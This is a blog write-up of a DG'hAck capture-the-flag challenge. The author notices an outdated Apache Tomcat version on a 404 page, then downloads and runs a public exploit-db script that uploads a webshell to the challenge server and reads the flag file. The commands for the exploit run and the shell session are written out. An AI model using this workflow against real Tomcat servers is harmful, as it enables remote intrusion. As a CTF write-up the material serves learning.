---
title: "Writeup DG'hAck: Walters Blog"
date: 2020-11-19T05:56:46+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

The challenge starts with a minecraft blog:

[![The homepage](/assets/dghack/walters-blog-home.png)](/assets/dghack/walters-blog-home.png)

None of the pages look vulnerable. The URLs themselves don't have any parameters, it's just some static html (eg: `/contact.html`). The contact form doesn't work: when posting something we get a 404.

On that same 404 page, we can notice the apache version:

```
Apache Tomcat/9.0.0.M1
```

Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on [exploit database](https://www.exploit-db.com/exploits/42966).

Let's use it:

```
$ wget https://www.exploit-db.com/raw/42966
$ python2 42966 -p pwn -u http://waltersblog3.chall.malicecyber.com
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    

[@intx0x80]

Uploading Webshell .....
$ ls

bin
boot
dev
entrypoint.sh
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
supervisord.log
supervisord.pid
sys
tmp
usr
var

$ cat flag.txt

flag{i4lW4y5UpD4T3Y0urt0mC@}
```

And there we go, the flag is `i4lW4y5UpD4T3Y0urt0mC@`.

---

[View all of the DG'hAck articles](/tags/dghack).
